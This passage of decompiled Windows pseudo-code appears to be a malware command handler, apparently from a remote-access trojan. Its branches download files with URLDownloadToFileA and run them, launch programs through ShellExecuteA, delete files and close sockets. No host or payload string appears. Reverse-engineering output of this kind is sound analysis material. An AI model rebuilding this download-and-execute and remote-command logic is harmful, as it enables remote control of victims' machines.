0x47981b;\n            fcn.004059a4();\n            uStack2540 = 0x498858;\n            uStack2544 = 0x47982d;\n            fcn.00405a48();\n            uStack2544 = 0x47983d;\n            fcn.00405964();\n            uStack2544 = 0x47984a;\n            fcn.00405a48();\n            uStack2544 = 0x479859;\n            fcn.004059a4();\n            uStack2544 = 0x479864;\n            fcn.00405504();\n            uStack2544 = 0x47986c;\n            *0x49891c = fcn.00409e54();\n            uStack2544 = 0x498818;\n            uStack2548 = 0;\n            uStack2552 = 0;\n            pcStack2556 = fcn.00481a04;\n            puStack2560 = NULL;\n            piStack2564 = NULL;\n            puStack2568 = 0x479888;\n            sub.kernel32.dll_CreateThread();\n            *0x492538 = 1;\n            uVar10 = 1;\n            *in_FS_OFFSET = piStack2564;\n        }\n        pcStack2556 = 0x4798b0;\n        fcn.00405894();\n        if (uVar10) {\n            *0x492538 = 0;\n        }\n        pcStack2556 = &stack0xfffff6cc;\n        puStack2560 = 0x4798d2;\n        fcn.00405964();\n        puStack2560 = 0x4798e2;\n        fcn.00405894();\n        if (uVar10) {\n            puStack2560 = 0x4798fa;\n            fcn.004059a4();\n            puStack2560 = &fcn.00472f6c::var_1ch;\n            piStack2564 = 0x47990b;\n            fcn.00405a48();\n            piStack2564 = 0x47991b;\n            fcn.00405964();\n            piStack2564 = 0x479928;\n            fcn.00405a48();\n            piStack2564 = 0x479937;\n            fcn.004059a4();\n            piStack2564 = &fcn.00472f6c::var_20h;\n            puStack2568 = 0x479948;\n            fcn.00405a48();\n            puStack2568 = 0x479958;\n            fcn.00405964();\n            puStack2568 = 0x479965;\n            fcn.00405a48();\n            puStack2568 = 0x479974;\n            fcn.004059a4();\n            puStack2568 = &fcn.00472f6c::var_24h;\n            puStack2572 = 0x479985;\n            fcn.00405a48();\n            puStack2572 = 0x479995;\n            fcn.00405964();\n            puStack2572 = 0x4799a2;\n            fcn.00405a48();\n            puStack2572 = 0x4799b1;\n            fcn.004059a4();\n            puStack2572 = &fcn.00472f6c::var_28h;\n            uStack2576 = 0x4799c2;\n            fcn.00405a48();\n            uStack2576 = 0x4799d2;\n            fcn.00405964();\n            uStack2576 = 0x4799df;\n            fcn.00405a48();\n            uStack2576 = 0x4799ee;\n            fcn.004059a4();\n            uStack2576 = 0x4799f9;\n            fcn.00405504();\n            uStack2576 = 0x14;\n            uStack2580 = 0x40;\n            puStack2584 = 0x479a02;\n            piStack2592 = sub.kernel32.dll_LocalAlloc_1();\n            puStack2584 = 0x479a17;\n            piStack796 = piStack2592;\n            fcn.00463d78();\n            puStack2584 = 0x479a28;\n            fcn.004054c0();\n            puStack2584 = 0x479a39;\n            fcn.004054c0();\n            puStack2584 = 0x479a4a;\n            fcn.004054c0();\n            puStack2584 = 0x479a5b;\n            fcn.004054c0();\n            uVar10 = piStack796 == 0xfffffff0;\n            puStack2584 = 0x479a6c;\n            fcn.004054c0();\n            puStack2584 = &fcn.00472f6c::var_2b4h;\n            uStack2588 = 0;\n            pcStack2596 = fcn.00487540;\n            uStack2600 = 0;\n            uStack2604 = 0;\n            uStack2608 = 0x479a84;\n            uStack2608 = sub.kernel32.dll_CreateThread();\n            puStack2612 = 0x479a8a;\n            sub.kernel32.dll_CloseHandle_1();\n        }\n        puStack2612 = 0x479a97;\n        fcn.00405894();\n        if (uVar10) {\n            puStack2612 = 0x479aaf;\n            fcn.00405784();\n            puStack2612 = 0x479aba;\n            fcn.00472b58();\n        }\n        puStack2612 = 0x479ac7;\n        fcn.00405894();\n        if (uVar10) {\n            puStack2612 = 0x479adf;\n            fcn.00405784();\n            puStack2612 = 0x479aea;\n            fcn.00472b58();\n        }\n        puStack2612 = &stack0xfffff6bc;\n        puStack2616 = 0x479b03;\n        fcn.00405964();\n        puStack2616 = 0x479b13;\n        fcn.00405894();\n        if (uVar10) {\n            puStack2616 = 0x479b2b;\n            fcn.004059a4();\n            uStack2620 = 0x479cf9;\n            piStack2624 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xfffff5c0;\n            piStack2628 = &fcn.00472f6c::var_28h;\n            puStack2632 = 0x479b4a;\n            puStack2616 = &stack0xfffffffc;\n            fcn.00405a48();\n            puStack2632 = 0x479b5a;\n            fcn.00405964();\n            puStack2632 = 0x479b67;\n            fcn.00405a48();\n            puStack2632 = 0x479b76;\n            fcn.004059a4();\n            puStack2632 = &fcn.00472f6c::var_1ch;\n            puStack2636 = 0x479b87;\n            fcn.00405a48();\n            puStack2636 = 0x479b97;\n            fcn.00405964();\n            puStack2636 = 0x479ba4;\n            fcn.00405a48();\n            puStack2636 = 0x479bb3;\n            fcn.004059a4();\n            puStack2636 = &fcn.00472f6c::var_20h;\n            piStack2640 = 0x479bc4;\n            fcn.00405a48();\n            piStack2640 = 0x479bd4;\n            fcn.00405964();\n            piStack2640 = 0x479be1;\n            fcn.00405a48();\n            piStack2640 = 0x479bf0;\n            fcn.004059a4();\n            piStack2640 = &fcn.00472f6c::var_24h;\n            piStack2644 = 0x479c01;\n            fcn.00405a48();\n            piStack2644 = 0x479c11;\n            fcn.00405964();\n            piStack2644 = 0x479c1e;\n            fcn.00405a48();\n            piStack2644 = 0x479c2d;\n            fcn.004059a4();\n            piStack2644 = 0x479c38;\n            fcn.00405504();\n            piStack2644 = 0x479c40;\n            cVar1 = fcn.00488d78();\n            if (cVar1 == '\\0') {\n                *in_FS_OFFSET = piStack2640;\n                *in_FS_OFFSET = piStack2628;\n                goto code_r0x0047ba11;\n            }\n            piStack2644 = 0x14;\n            iStack2648 = 0x40;\n            piStack2652 = 0x479c62;\n            piStack2660 = sub.kernel32.dll_LocalAlloc_1();\n            piStack2652 = 0x479c77;\n            piStack800 = piStack2660;\n            fcn.00463d78();\n            piStack2652 = 0x479c8d;\n            fcn.00405784();\n            piStack2652 = 0x479c9e;\n            fcn.004054c0();\n            piStack2652 = 0x479caf;\n            fcn.004054c0();\n            piStack2652 = 0x479cc0;\n            fcn.004054c0();\n            piStack2652 = 0x479cd1;\n            fcn.004054c0();\n            piStack2652 = &fcn.00472f6c::var_2b4h;\n            iStack2656 = 0;\n            pcStack2664 = fcn.00482d30;\n            piStack2668 = NULL;\n            iStack2672 = 0;\n            piStack2676 = 0x479ce9;\n            piStack2676 = sub.kernel32.dll_CreateThread();\n            uStack2680 = 0x479cef;\n            sub.kernel32.dll_CloseHandle_1();\n            uVar10 = 1;\n            *in_FS_OFFSET = piStack2676;\n        }\n        piStack2668 = 0x479d10;\n        fcn.00405894();\n        if (uVar10) {\n            piStack2668 = 0x479d1d;\n            fcn.00467c30();\n            uVar10 = pcStack2380 == NULL;\n            if (!uVar10) {\n                piStack2668 = 0x479d31;\n                fcn.00467c30();\n                piStack2668 = 0x479d47;\n                fcn.00405784();\n                piStack2668 = 0x479d52;\n                fcn.00472b58();\n            }\n        }\n        piStack2668 = &stack0xfffff6a8;\n        iStack2672 = 0x479d6b;\n        fcn.00405964();\n        iStack2672 = 0x479d7b;\n        fcn.00405894();\n        if (uVar10) {\n            iStack2672 = 0x479d8f;\n            fcn.004059a4();\n            iStack2672 = 0x479d94;\n            fcn.00430e94();\n            iStack2672 = 0x479d9c;\n            fcn.00430a1c();\n        }\n        iStack2672 = 0x479da9;\n        fcn.00405894();\n        if (uVar10) {\n            iStack2672 = 5;\n            piStack2676 = NULL;\n            uStack2680 = 0;\n            var_a78h = 0x47d4b0;\n            var_a7ch = 0x47bd5c;\n            uStack2692 = 0;\n            puStack2696 = 0x479dc2;\n            sub.shell32.dll_ShellExecuteA();\n        }\n        puStack2696 = 0x479dcf;\n        fcn.00405894();\n        if (uVar10) {\n            puStack2696 = 0x479dd8;\n            fcn.0048a324();\n        }\n        puStack2696 = 0x479de5;\n        fcn.00405894();\n        if (uVar10) {\n            uVar10 = 1;\n            puStack2696 = 0x479dee;\n            fcn.0048a324();\n        }\n        puStack2696 = &stack0xfffff6a4;\n        var_a88h = 0x479e07;\n        fcn.00405964();\n        var_a88h = 0x479e17;\n        fcn.00405894();\n        if (uVar10) {\n            var_a88h = 0x479e2f;\n            fcn.004059a4();\n            uStack2704 = 0x479f44;\n            piStack2708 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xfffff56c;\n            puStack2712 = &stack0xfffffedc;\n            puStack2716 = 0x479e51;\n            var_a88h = &stack0xfffffffc;\n            fcn.00405a48();\n            puStack2716 = 0x479e61;\n            fcn.00405964();\n            puStack2716 = 0x479e6e;\n            fcn.00405a48();\n            puStack2716 = 0x479e7d;\n            fcn.004059a4();\n            puStack2716 = &stack0xfffffed8;\n            puStack2720 = 0x479e91;\n            fcn.00405a48();\n            puStack2720 = 0x479ea1;\n            fcn.00405964();\n            puStack2720 = 0x479eae;\n            fcn.00405a48();\n            puStack2720 = 0x479ebd;\n            fcn.004059a4();\n            puStack2720 = &stack0xfffffed4;\n            uStack2724 = 0x479ed1;\n            fcn.00405a48();\n            uStack2724 = 0x479ee1;\n            fcn.00405964();\n            uStack2724 = 0x479eee;\n            fcn.00405a48();\n            uStack2724 = 0x479efd;\n            fcn.004059a4();\n            uStack2724 = 0x479f08;\n            fcn.00405504();\n            uStack2724 = 0x479f13;\n            uStack2724 = fcn.00409e54();\n            puStack2728 = 0x479f1f;\n            puStack2728 = fcn.004058fc();\n            puStack2732 = 0x479f2b;\n            puStack2732 = fcn.004058fc();\n            piStack2736 = 0x479f34;\n            piStack2736 = fcn.00409e54();\n            piStack2740 = 0x479f3a;\n            sub.user32.dll_MessageBoxA_1();\n            uVar10 = 1;\n            *in_FS_OFFSET = piStack2736;\n        }\n        puStack2728 = &stack0xfffff6a0;\n        puStack2732 = 0x479f79;\n        fcn.00405964();\n        puStack2732 = 0x479f89;\n        fcn.00405894();\n        if (uVar10) {\n            puStack2732 = 0x479fa1;\n            fcn.004059a4();\n            piStack2736 = 0x47a0d1;\n            piStack2740 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xfffff54c;\n            puStack2744 = &fcn.00472f6c::var_1ch;\n            puStack2748 = 0x479fc0;\n            puStack2732 = &stack0xfffffffc;\n            fcn.00405a48();\n            puStack2748 = 0x479fd0;\n            fcn.00405964();\n            puStack2748 = 0x479fdd;\n            fcn.00405a48();\n            puStack2748 = 0x479fec;\n            fcn.004059a4();\n            puStack2748 = &fcn.00472f6c::var_20h;\n            uStack2752 = 0x479ffd;\n            fcn.00405a48();\n            uStack2752 = 0x47a00d;\n            fcn.00405964();\n            uStack2752 = 0x47a01a;\n            fcn.00405a48();\n            uStack2752 = 0x47a029;\n            fcn.004059a4();\n            uStack2752 = 0x47a034;\n            fcn.00405504();\n            uStack2752 = 0x14;\n            uStack2756 = 0x40;\n            puStack2760 = 0x47a03d;\n            puStack2768 = sub.kernel32.dll_LocalAlloc_1();\n            puStack2760 = 0x47a052;\n            puStack804 = puStack2768;\n            fcn.00466444();\n            puStack2760 = 0x47a063;\n            fcn.004054c0();\n            puStack2760 = 0x47a074;\n            fcn.004054c0();\n            puStack2760 = 0x47a085;\n            fcn.004054c0();\n            puStack2760 = 0x47a096;\n            fcn.004054c0();\n            puStack2760 = 0x47a0a9;\n            fcn.004054c0();\n            puStack2760 = &fcn.00472f6c::var_2b4h;\n            uStack2764 = 0;\n            pcStack2772 = fcn.00485178;\n            puStack2776 = NULL;\n            puStack2780 = NULL;\n            piStack2784 = 0x47a0c1;\n            piStack2784 = sub.kernel32.dll_CreateThread();\n            uStack2788 = 0x47a0c7;\n            sub.kernel32.dll_CloseHandle_1();\n            uVar10 = 1;\n            *in_FS_OFFSET = piStack2784;\n        }\n        puStack2776 = &fcn.00472f6c::var_964h;\n        puStack2780 = 0x47a0fe;\n        fcn.00405964();\n        puStack2780 = 0x47a10e;\n        fcn.00405894();\n        if (uVar10) {\n            puStack2780 = 0x47a126;\n            fcn.004059a4();\n            puStack2780 = &fcn.00472f6c::var_1ch;\n            piStack2784 = 0x47a137;\n            fcn.00405a48();\n            piStack2784 = 0x47a147;\n            fcn.00405964();\n            piStack2784 = 0x47a154;\n            fcn.00405a48();\n            piStack2784 = 0x47a163;\n            fcn.004059a4();\n            piStack2784 = 0x47a16e;\n            fcn.00405504();\n            piStack2784 = 0x47a178;\n            fcn.0040546c();\n            piStack2784 = var_1ch;\n            uStack2788 = 0x47d554;\n            piStack2792 = var_20h;\n            uStack2796 = 0x47a192;\n            fcn.00405800();\n            uStack860 = 0x498810;\n            uVar10 = 1;\n            uStack2796 = 0x47a1ae;\n            fcn.00403aac();\n            uStack2796 = 0x47a1be;\n            fcn.0047dc3c();\n            uStack2796 = 0x47a1d4;\n            fcn.00406a5c();\n            uStack2796 = 1000;\n            piStack2800 = 0x47a1de;\n            sub.kernel32.dll_Sleep_1();\n            piStack2800 = *0x4987e4;\n            puStack2804 = 0x47a1e9;\n            sub.wsock32.dll_closesocket();\n        }\n        puStack2804 = &stack0xfffff690;\n        puStack2808 = 0x47a202;\n        fcn.00405964();\n        puStack2808 = 0x47a212;\n        fcn.00405894();\n        if (uVar10) {\n            puStack2808 = 0x47a22a;\n            fcn.004059a4();\n            uStack2812 = 0x47a2da;\n            piStack2816 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xfffff500;\n            puStack2820 = &fcn.00472f6c::var_1ch;\n            uStack2824 = 0x47a249;\n            puStack2808 = &stack0xfffffffc;\n            fcn.00405a48();\n            uStack2824 = 0x47a259;\n            fcn.00405964();\n            uStack2824 = 0x47a266;\n            fcn.00405a48();\n            uStack2824 = 0x47a275;\n            fcn.004059a4();\n            uStack2824 = 0x47a280;\n            fcn.00405504();\n            uStack2824 = 8;\n            uStack2828 = 0x40;\n            puStack2832 = 0x47a289;\n            piStack2840 = sub.kernel32.dll_LocalAlloc_1();\n            puStack2832 = 0x47a2a1;\n            piStack808 = piStack2840;\n            fcn.004054c0();\n            puStack2832 = 0x47a2a9;\n            iVar7 = fcn.00409e54();\n            piStack808[1] = iVar7;\n            puStack2832 = &stack0xfffffd18;\n            uStack2836 = 0;\n            pcStack2844 = fcn.00488614;\n            puStack2848 = NULL;\n            puStack2852 = NULL;\n            piStack2856 = 0x47a2ca;\n            piStack2856 = sub.kernel32.dll_CreateThread();\n            piStack2860 = 0x47a2d0;\n            sub.kernel32.dll_CloseHandle_1();\n            uVar10 = 1;\n            *in_FS_OFFSET = piStack2856;\n        }\n        puStack2848 = &stack0xfffff68c;\n        puStack2852 = 0x47a30f;\n        fcn.00405964();\n        puStack2852 = 0x47a31f;\n        fcn.00405894();\n        if (uVar10) {\n            puStack2852 = 0x47a337;\n            fcn.004059a4();\n            uVar10 = 1;\n            piStack2856 = 0x47a41a;\n            piStack2860 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xfffff4d4;\n            puStack2864 = &stack0xfffff684;\n            puStack2868 = 0x47a35e;\n            puStack2852 = &stack0xfffffffc;\n            fcn.00405964();\n            puStack2868 = 0x47a36f;\n            fcn.00409754();\n            puStack2868 = 0x47a37f;\n            fcn.00405894();\n            if (!uVar10) {\n                puStack2868 = &stack0xfffff67c;\n                uStack2872 = 0x47a39a;\n                fcn.00405964();\n                uStack2872 = 0x47a3ab;\n                fcn.00409754();\n                uStack2872 = 0x47a3bb;\n                fcn.00405894();\n                if (!uVar10) {\n                    uStack2872 = 0x47a3cd;\n                    fcn.00405784();\n                }\n            }\n            uStack2872 = 5;\n            uStack2876 = 0;\n            uStack2880 = 0;\n            uStack2884 = 0x47a3db;\n            uStack2884 = fcn.004058fc();\n            uStack2888 = 0x47bd5c;\n            uStack2892 = 0;\n            puStack2896 = 0x47a3e8;\n            sub.shell32.dll_ShellExecuteA();\n            puStack2896 = 0x47d5c0;\n            piStack2900 = var_4h;\n            piStack2904 = 0x47d5d8;\n            uStack2908 = 0x47a405;\n            fcn.00405800();\n            uStack2908 = 0x47a410;\n            fcn.00472b58();\n            uVar10 = 1;\n            *in_FS_OFFSET = piStack2904;\n        }\n        puStack2896 = 0x47a443;\n        fcn.00405894();\n        if (uVar10) {\n            puStack2896 = 0x47a44f;\n            fcn.00472b58();\n        }\n        puStack2896 = &stack0xfffff674;\n        piStack2900 = 0x47a468;\n        fcn.00405964();\n        piStack2900 = 0x47a478;\n        fcn.00405894();\n        if (uVar10) {\n            piStack2900 = 0x47a48c;\n            fcn.004059a4();\n            piStack2900 = 0x5;\n            piStack2904 = NULL;\n            uStack2908 = 0;\n            uStack2912 = 0x47a49a;\n            uStack2912 = fcn.004058fc();\n            uStack2916 = 0x47bd5c;\n            uStack2920 = 0;\n            uStack2924 = 0x47a4a7;\n            sub.shell32.dll_ShellExecuteA();\n            uStack2924 = 0x47d5c0;\n            piStack2928 = var_4h;\n            uStack2932 = 0x47d64c;\n            puStack2936 = 0x47a4c4;\n            fcn.00405800();\n            puStack2936 = 0x47a4cf;\n            fcn.00472b58();\n        }\n        puStack2936 = 0x47a4dc;\n        fcn.00405894();\n        if (uVar10) {\n            puStack2940 = 0x47a50a;\n            piStack2944 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xfffff480;\n            piStack2948 = 0x47a4f6;\n            puStack2936 = &stack0xfffffffc;\n            fcn.00472b58();\n            piStack2948 = 0x47a4fb;\n            sub.kernel32.dll_GetCurrentProcessId();\n            piStack2948 = 0x47a500;\n            fcn.00463be0();\n            uVar10 = 1;\n            *in_FS_OFFSET = piStack2944;\n        }\n        puStack2936 = 0x47a533;\n        fcn.00405894();\n        if (uVar10) {\n            puStack2936 = 0x47a53f;\n            fcn.00472b58();\n            uVar10 = 1;\n            puStack2936 = 0x47a546;\n            fcn.00472134();\n        }\n        puStack2936 = &stack0xfffff66c;\n        puStack2940 = 0x47a55f;\n        fcn.00405964();\n        puStack2940 = 0x47a56f;\n        fcn.00405894();\n        if (uVar10) {\n            puStack2940 = 0x47a587;\n            fcn.004059a4();\n            piStack2944 = 0x47a65b;\n            piStack2948 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xfffff47c;\n            uStack2952 = 0x47a59f;\n            puStack2940 = &stack0xfffffffc;\n            fcn.00472b58();\n            uStack2952 = 0;\n            piStack2956 = NULL;\n            uStack2960 = 0x47a5ae;\n            fcn.00463d78();\n            uStack2960 = 0x47a5be;\n            fcn.00405738();\n            uStack2960 = 0x47a5c9;\n            uStack2960 = fcn.004058fc();\n            uStack2964 = 0x47a5d2;\n            uStack2964 = fcn.004058fc();\n            piStack2968 = NULL;\n            uStack2972 = 0x47a5da;\n            iVar7 = sub.URLMON.DLL_URLDownloadToFileA();\n            if (iVar7 != 0) {\n                uStack2972 = 0x47a5e8;\n                fcn.00472b58();\n                *in_FS_OFFSET = piStack2968;\n                *in_FS_OFFSET = piStack2956;\n                goto code_r0x0047ba11;\n            }\n            uStack2972 = 0x47a607;\n            fcn.00472b58();\n            uStack2972 = 5;\n            uStack2976 = 0;\n            uStack2980 = 0;\n            puStack2984 = 0x47a618;\n            fcn.00463d78();\n            puStack2984 = 0x47a628;\n            fcn.00405738();\n            puStack2984 = 0x47a633;\n            puStack2984 = fcn.004058fc();\n            puStack2988 = 0x47bd5c;\n            piStack2992 = NULL;\n            piStack2996 = 0x47a640;\n            sub.shell32.dll_ShellExecuteA();\n            piStack2996 = 0x47a64a;\n            fcn.00472b58();\n            piStack2996 = 0x47a651;\n            fcn.00472134();\n            uVar10 = 1;\n            *in_FS_OFFSET = piStack2992;\n        }\n        puStack2984 = &stack0xfffff660;\n        puStack2988 = 0x47a67e;\n        fcn.00405964();\n        puStack2988 = 0x47a68e;\n        fcn.00405894();\n        if (uVar10) {\n            puStack2988 = 0x47a6a6;\n            fcn.004059a4();\n            piStack2992 = 0x47a7d3;\n            piStack2996 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xfffff44c;\n            puStack3000 = &fcn.00472f6c::var_1ch;\n            uStack3004 = 0x47a6c5;\n            puStack2988 = &stack0xfffffffc;\n            fcn.00405a48();\n            uStack3004 = 0x47a6d5;\n            fcn.00405964();\n            uStack3004 = 0x47a6e2;\n            fcn.00405a48();\n            uStack3004 = 0x47a6f1;\n            fcn.004059a4();\n            uStack3004 = 0x47a6fc;\n            fcn.00405504();\n            uStack3004 = 0x47a706;\n            fcn.00472b58();\n            uStack3004 = 0;\n            piStack3008 = NULL;\n            puStack3012 = 0x47a715;\n            fcn.00463d78();\n            puStack3012 = &stack0xfffff65c;\n            uStack3016 = 0x47a72a;\n            fcn.0040a604();\n            puStack3012 = 0x47a736;\n            fcn.00405738();\n            puStack3012 = 0x47a741;\n            puStack3012 = fcn.004058fc();\n            uStack3016 = 0x47a74a;\n            uStack3016 = fcn.004058fc();\n            piStack3020 = NULL;\n            uStack3024 = 0x47a752;\n            iVar7 = sub.URLMON.DLL_URLDownloadToFileA();\n            if (iVar7 != 0) {\n                uStack3024 = 0x47a760;\n                fcn.00472b58();\n                *in_FS_OFFSET = piStack3020;\n                *in_FS_OFFSET = piStack3008;\n                goto code_r0x0047ba11;\n            }\n            uStack3024 = 0x47a77f;\n            fcn.00472b58();\n            uStack3024 = 5;\n            uStack3028 = 0;\n            uStack3032 = 0;\n            puStack3036 = 0x47a790;\n            fcn.00463d78();\n            puStack3036 = &stack0xfffff654;\n            puStack3040 = 0x47a7a5;\n            fcn.0040a604();\n            puStack3036 = 0x47a7b1;\n            fcn.00405738();\n            puStack3036 = 0x47a7bc;\n            puStack3036 = fcn.004058fc();\n            puStack3040 = 0x47bd5c;\n            piStack3044 = NULL;\n            pcStack3048 = 0x47a7c9;\n            sub.shell32.dll_ShellExecuteA();\n            uVar10 = 1;\n            *in_FS_OFFSET = piStack3044;\n        }\n        puStack3036 = 0x47a7ea;\n        fcn.00405894();\n        if (uVar10) {\n            puStack3036 = 0x498818;\n            puStack3040 = NULL;\n            piStack3044 = NULL;\n            pcStack3048 = fcn.00481dd8;\n            puStack3052 = NULL;\n            puStack3056 = NULL;\n            uStack3060 = 0x47a803;\n            uStack3060 = sub.kernel32.dll_CreateThread();\n            uStack3064 = 0x47a809;\n            sub.kernel32.dll_CloseHandle_1();\n        }\n        puStack3036 = 0x47a816;\n        fcn.00405894();\n        if (uVar10) {\n            puStack3036 = 0x47a820;\n            fcn.0046eebc();\n            puStack3036 = 0x47a833;\n            fcn.00405784();\n            puStack3036 = 0x47a83e;\n            fcn.00472b58();\n        }\n        puStack3036 = &stack0xfffff648;\n        puStack3040 = 0x47a857;\n        fcn.00405964();\n        puStack3040 = 0x47a867;\n        fcn.00405894();\n        if (uVar10) {\n            puStack3040 = 0x47a87f;\n            fcn.004059a4();\n            piStack3044 = 0x47ab62;\n            pcStack3048 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xfffff418;\n            puStack3052 = &fcn.00472f6c::var_1ch;\n            puStack3056 = 0x47a89e;\n            puStack3040 = &stack0xfffffffc;\n            fcn.00405a48();\n            puStack3056 = 0x47a8ae;\n            fcn.00405964();\n            puStack3056 = 0x47a8bb;\n            fcn.00405a48();\n            puStack3056 = 0x47a8ca;\n            fcn.004059a4();\n            puStack3056 = &fcn.00472f6c::var_20h;\n            uStack3060 = 0x47a8db;\n            fcn.00405a48();\n            uStack3060 = 0x47a8eb;\n            fcn.00405964();\n            uStack3060 = 0x47a8f8;\n            fcn.00405a48();\n            uStack3060 = 0x47a907;\n            fcn.004059a4();\n            uStack3060 = 0x47a912;\n            fcn.00405504();\n            uStack3060 = 0x47a91d;\n            fcn.00463d78();\n            uStack3060 = 0x47a92d;\n            fcn.00405738();\n            uStack3060 = 0x47a938;\n            fcn.004058fc();\n            uStack3060 = 0x47a945;\n            fcn.00405664();\n            uStack864 = uStack2492;\n            uStack3060 = 0x47a95c;\n            uStack3060 = fcn.004058fc();\n            uStack3064 = 0x47a962;\n            iVar7 = sub.kernel32.dll_DeleteFileA();\n            uStack868 = uStack868 & 0xffffff | 1 - (iVar7 == 0) << 0x18;\n            uStack3064 = 0x47a979;\n            fcn.00463d78();\n            uStack3064 = 0x47a989;\n            fcn.00405738();\n            uStack3064 = 0x47a996;\n            fcn.00489aa0();\n            uStack3064 = 0x47a9a1;\n            fcn.00463d78();\n            uStack3064 = 0x47a9b1;\n            fcn.00405738();\n            uStack3064 = 0x47a9be;\n            fcn.00489aa0();\n            uStack3064 = 0x47d97c;\n            uStack3068 = 0x47a9ce;\n            fcn.00463d78();\n            uStack3068 = 0x47a9de;\n            fcn.00405738();\n            uStack3068 = uStack2508;\n            uStack3072 = 0x47a9f0;\n            fcn.00463d78();\n            uStack3072 = 0x47aa00;\n            fcn.00405738();\n            uStack3068 = 0x47aa11;\n            fcn.0046f44c();\n            uStack3068 = 0x47aa1c;\n            fcn.00463d78();\n            uStack3068 = 0x47aa2c;\n            fcn.00405738();\n            uStack3068 = 0x47aa3a;\n            fcn.004899f8();\n            uStack3068 = 0x47aa45;\n            fcn.00463d78();\n            uStack3068 = 0x47aa55;\n            fcn.00405738();\n            puStack872 = puStack2520;\n            uStack3068 = 0x47aa6c;\n            uStack3068 = fcn.004058fc();\n            uStack3072 = 0x47aa72;\n            iVar7 = sub.kernel32.dll_DeleteFileA();\n            uStack876 = uStack876 & 0xffffff | 1 - (iVar7 == 0) << 0x18;\n            uStack3072 = 0x47aa89;\n            fcn.00463d78();\n            uStack3072 = 0x47aa99;\n            fcn.00405738();\n            piStack880 = piStack2524;\n            uStack3072 = 0x47aab0;\n            uStack3072 = fcn.004058fc();\n            uStack3076 = 0x47aab6;\n            iVar7 = sub.kernel32.dll_DeleteFileA();\n            uStack884 = uStack884 & 0xffffff | 1 - (iVar7 == 0) << 0x18;\n            uStack3076 = 0x14;\n            uStack3080 = 0x40;\n            puStack3084 = 0x47aacb;\n            puStack3092 = sub.kernel32.dll_LocalAlloc_1();\n            puStack3084 = 0x47aae3;\n            piStack812 = puStack3092;\n            fcn.0046f6ec();\n            puStack3084 = 0x47aaf4;\n            fcn.004054c0();\n            puStack3084 = 0x47ab05;\n            fcn.004054c0();\n            puStack3084 = 0x47ab16;\n            fcn.004054c0();\n            puStack3084 = 0x47ab27;\n            fcn.004054c0();\n            puStack3084 = 0x47ab3a;\n            fcn.004054c0();\n            puStack3084 = &fcn.00472f6c::var_2b4h;\n            uStack3088 = 0;\n            pcStack3096 = fcn.00485178;\n            puStack3100 = NULL;\n            puStack3104 = NULL;\n            piStack3108 = 0x47ab52;\n            piStack3108 = sub.kernel32.dll_CreateThread();\n            piStack3112 = 0x47ab58;\n            sub.kernel32.dll_CloseHandle_1();\n            uVar10 = 1;\n            *in_FS_OFFSET = piStack3108;\n        }\n        puStack3100 = &stack0xfffff61c;\n        puStack3104 = 0x47ab8f;\n        fcn.00405964();\n        puStack3104 = 0x47ab9f;\n        fcn.00405894();\n        if (uVar10) {\n            puStack3104 = 0x47abb7;\n            fcn.004059a4();\n            piStack3108 = 0x47aca1;\n            piStack3112 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xfffff3d8;\n            piStack3116 = &fcn.00472f6c::var_1ch;\n            uStack3120 = 0x47abd6;\n            puStack3104 = &stack0xfffffffc;\n            fcn.00405a48();\n            uStack3120 = 0x47abe6;\n            fcn.00405964();\n            uStack3120 = 0x47abf3;\n            fcn.00405a48();\n            uStack3120 = 0x47ac02;\n            fcn.004059a4();\n            uStack3120 = 0x47ac0d;\n            fcn.00463d78();\n            uStack3120 = uStack2540;\n            uStack3124 = 0x47d9f0;\n            piStack3128 = var_4h;\n            puStack3132 = 0x47ac2b;\n            fcn.00405800();\n            puStack3132 = 0x47ac36;\n            cVar1 = fcn.0040a1e4();\n            if (cVar1 == '\\0') {\n                puStack3132 = 0x47ac44;\n                fcn.00472b58();\n                *in_FS_OFFSET = piStack3128;\n                *in_FS_OFFSET = piStack3116;\n                goto code_r0x0047ba11;\n            }\n            puStack3132 = &fcn.00472f6c::var_2b4h;\n            uStack3136 = 0;\n            piStack3140 = var_1ch;\n            uStack3144 = 0x47bbe4;\n            piStack3148 = var_4h;\n            uStack3152 = 0x47ac7d;\n            fcn.00405800();\n            uStack3152 = 0x47ac88;\n            uStack3152 = fcn.004058fc();\n            pcStack3156 = fcn.0048a7a4;\n            puStack3160 = NULL;\n            piStack3164 = NULL;\n            piStack3168 = 0x47ac97;\n            sub.kernel32.dll_CreateThread();\n            uVar10 = 1;\n            *in_FS_OFFSET = piStack3164;\n        }\n        pcStack3156 = &stack0xfffff60c;\n        puStack3160 = 0x47acd6;\n        fcn.00405964();\n        puStack3160 = 0x47ace6;\n        fcn.00405894();\n        if (uVar10) {\n            puStack3160 = 0x47acfe;\n            fcn.004059a4();\n            piStack3164 = 0x47ad7d;\n            piStack3168 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xfffff3a0;\n            piStack3172 = &fcn.00472f6c::var_1ch;\n            uStack3176 = 0x47ad1d;\n            puStack3160 = &stack0xfffffffc;\n            fcn.00405a48();\n            uStack3176 = 0x47ad2d;\n            fcn.00405964();\n            uStack3176 = 0x47ad3a;\n            fcn.00405a48();\n            uStack3176 = 0x47ad49;\n            fcn.004059a4();\n            uStack3176 = 0x47ad51;\n            uStack3180 = fcn.0048a6a4();\n            uStack3176 = 0x47da20;\n            pcStack3184 = 0x47ad5e;\n            piStack752 = sub.kernel32.dll_GetProcAddress_1();\n            pcStack3184 = 0x47ad6c;\n            pcStack3184 = fcn.004058fc();\n            uStack3188 = 0x47ad73;\n            (*piStack752)();\n            uVar10 = 1;\n            *in_FS_OFFSET = piStack3168;\n        }\n        puStack3160 = &stack0xfffff608;\n        piStack3164 = 0x47adb2;\n        fcn.00405964();\n        piStack3164 = 0x47adc2;\n        fcn.00405894();\n        if (uVar10) {\n            piStack3164 = 0x47add6;\n            fcn.004059a4();\n            piStack3168 = 0x47adfe;\n            piStack3172 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xfffff39c;\n            